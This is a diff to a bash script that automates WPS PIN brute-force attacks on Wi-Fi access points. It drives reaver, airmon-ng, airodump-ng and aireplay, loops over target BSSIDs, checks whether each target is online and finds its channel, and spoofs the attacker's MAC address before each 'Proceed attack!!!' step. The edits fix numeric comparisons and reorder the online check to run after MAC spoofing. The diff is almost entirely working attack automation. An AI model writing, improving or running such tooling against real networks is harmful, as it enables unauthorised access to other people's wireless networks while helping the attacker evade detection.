@@ -180,7 +180,7 @@ while true; do
     NOW=\$(date +%s);
     CURRENT_INACTIVITY=\$[\$NOW-\$LASTMOD];
     echo \$(date)": Reaver inactivity...\$CURRENT_INACTIVITY/\$TIMEOUT seconds";
-    if [[ \$[\$NOW] > \$[\$LASTMOD+\$TIMEOUT] ]]; then
+    if [[ \$[\$NOW] -gt \$[\$LASTMOD+\$TIMEOUT] ]]; then
 	killall -INT reaver;
 	echo "Reaver killed...";
     fi
@@ -271,7 +271,7 @@ echoBlue(){
 isAPOnline(){
   #local CHECK=$(iwlist wlan0 scan | grep "$1");
   if [[ -z $(ifconfig | grep "mon0") ]]; then
-    airmon-ng start $WIRELESS_INTERFACE;
+    airmon-ng start $WIRELESS_INTERFACE &>/dev/null;
   fi
   local BSSID=$1;
   local CHANNEL=$2;
@@ -280,7 +280,7 @@ isAPOnline(){
   local BEGIN_TIME=$(date +%s);
   # clear old logs
   rm $AIRODUMP_CSV_LOG 2>/dev/null;
-  nohup airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID --channel=$CHANNEL mon0 &> /dev/null &
+  airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID --channel=$CHANNEL mon0 &> /dev/null &
   local LAST_PID=$!;
   while true; do
       # re-check airodump-ng log after X seconds
@@ -291,21 +291,22 @@ isAPOnline(){
       if [[ -n "$CHECK" ]]; then
 	  kill $LAST_PID;
 	  rm $AIRODUMP_CSV_LOG 2>/dev/null;
-	  echo 1;
+	  echo "1";
 	  return;
       fi
       # if we reached timeout we have to end with failure
       # so AP is offline
-      if [[ $[$BEGIN_TIME+$BSSID_ONLINE_TIMEOUT] < $[$(date +%s)] ]]; then
+      if [[ $[$BEGIN_TIME+$BSSID_ONLINE_TIMEOUT] -lt $[$(date +%s)] ]]; then
 	  kill $LAST_PID;
 	  rm $AIRODUMP_CSV_LOG 2>/dev/null;
-	  echo 0;
+	  echo "0";
 	  return;
       fi
   done
 }
 
-# it gets timeout from global BSSID_ONLINE_TIMEOUT
+# it gets timeout from globals: BSSID_ONLINE_TIMEOUT, TMP_DIR
+# 
 findAPChannel(){
   if [[ -z $(ifconfig | grep "mon0") ]]; then
     airmon-ng start $WIRELESS_INTERFACE;
@@ -317,7 +318,6 @@ findAPChannel(){
    # clear old logs
   rm $AIRODUMP_CSV_LOG 2>/dev/null;
   nohup airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID mon0 &> /dev/null &
-  #airodump-ng --bssid 08:60:6E:EE:72:D0 mon0 2>&1 | awk '{ if(/08:60:6E:EE:72:D0/){ print $6;} }'
   local LAST_PID=$!;
   while true; do
       # re-check airodump-ng log after X seconds
@@ -331,7 +331,7 @@ findAPChannel(){
 	  return $CHANNEL;
       fi
       # if we reached timeout we have to end with failure
-      if [[ $[$BEGIN_TIME+$BSSID_ONLINE_TIMEOUT] < $[$(date +%s)] ]]; then
+      if [[ $[$BEGIN_TIME+$BSSID_ONLINE_TIMEOUT] -lt $[$(date +%s)] ]]; then
 	  kill $LAST_PID;
 	  rm $AIRODUMP_CSV_LOG 2>/dev/null;
 	  echo 0;
@@ -346,7 +346,7 @@ if [[ $(whoami) != 'root' ]]; then
    exit;
 fi
 
-if [[ $[$INACTIVITY_TIMEOUT] > 0 ]]; then
+if [[ $[$INACTIVITY_TIMEOUT] -gt 0 ]]; then
     makeActivityChecker;  
 fi
 
@@ -417,7 +417,7 @@ while true; do
       fi
 
       ########## SLEEP BETWEEN APS ###############
-      if [[ $[$SLEEP_BETWEEN_APS] > 0 ]]; then
+      if [[ $[$SLEEP_BETWEEN_APS] -gt 0 ]]; then
 	echoBlue "Sleeping between AP's for $SLEEP_BETWEEN_APS seconds....";
 	sleep $SLEEP_BETWEEN_APS;
       fi
@@ -443,27 +443,6 @@ while true; do
 	  echoBlue "I found  "$(head -1 $SESSIONFILE)"  checked PINs in session file";
       fi
 
-      ######## SCAN TO CHECK IF AP IS ONLINE #########
-      echoBlue "Wait $BSSID_ONLINE_TIMEOUT seconds... scanning if $BSSID ($ESSID) is online";
-      # in case that channel is random we have to discover it (but it takes longer time since airodump-ng must hopping between channels)
-      if [[ $CHANNEL == "R" ]]; then
-		echoBlue "Searching for channel....";
-		CHANNEL=$(findAPChannel $BSSID);
-		if [[ $CHANNEL != 0 ]]; then
-		    echoBlue "$BSSID IS ONLINE!!! Currently it has CHANNEL  $CHANNEL  Proceeed attack!!!";
-		else 
-		    echoBlue "$BSSID ($ESSID) is OFFLINE (couldn't find channel).. skipping to another...";
-		    continue;
-		fi
-      else 
-	        if [[ $(isAPOnline $BSSID $CHANNEL) == 1 ]]; then
-		    echoBlue "$BSSID ($ESSID) IS ONLINE!!! Proceed attack!!!";
-		else 
-		    echoBlue "$BSSID ($ESSID) is OFFLINE.. skipping to another...";
-		    continue;
-		fi
-      fi
-
 
       ######### CHANGE MAC IF SPOOFED ########
       # here we generate random mac address (containing only numbers 0-9)
@@ -475,6 +454,27 @@ while true; do
       if [ ! -z "$SPOOFED_MAC" ] && [ "$MAC" != "$SPOOFED_MAC" ]; then
 	      MAC=$SPOOFED_MAC;
 	      changeMacTo $SPOOFED_MAC;
+      fi
+
+      ######## SCAN TO CHECK IF AP IS ONLINE #########
+      echoBlue "Wait $BSSID_ONLINE_TIMEOUT seconds... scanning if $BSSID ($ESSID) is online";
+      # in case that channel is random we have to discover it (but it takes longer time since airodump-ng must hopping between channels)
+      if [[ $CHANNEL == "R" ]]; then
+		echoBlue "Searching for channel....";
+		CHANNEL=$(findAPChannel $BSSID);
+		if [[ $CHANNEL != "0" ]]; then
+		    echoBlue "$BSSID IS ONLINE!!! Currently it has CHANNEL  $CHANNEL  Proceeed attack!!!";
+		else 
+		    echoBlue "$BSSID ($ESSID) is OFFLINE (couldn't find channel).. skipping to another...";
+		    continue;
+		fi
+      else 
+	        if [[ $(isAPOnline $BSSID $CHANNEL) == "1" ]]; then
+		    echoBlue "$BSSID ($ESSID) IS ONLINE!!! Proceed attack!!!";
+		else 
+		    echoBlue "$BSSID ($ESSID) is OFFLINE.. skipping to another...";
+		    continue;
+		fi
       fi
 
       ############# START KONSOLE COMMANDS WITH: REAVER && R.A.C. && AIREPLAY && AIRODUMP
@@ -532,7 +532,7 @@ while true; do
     done
 
     ########## SLEEP AFTER LIST RECHECK #################
-    if [[ $[$SLEEP_BEFORE_LIST_RECHECK] > 0 ]]; then
+    if [[ $[$SLEEP_BEFORE_LIST_RECHECK] -gt 0 ]]; then
       echoBlue "Sleeping before another list re-check for $SLEEP_BEFORE_LIST_RECHECK seconds....";
       echoBlue ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>";
       sleep $SLEEP_BEFORE_LIST_RECHECK;
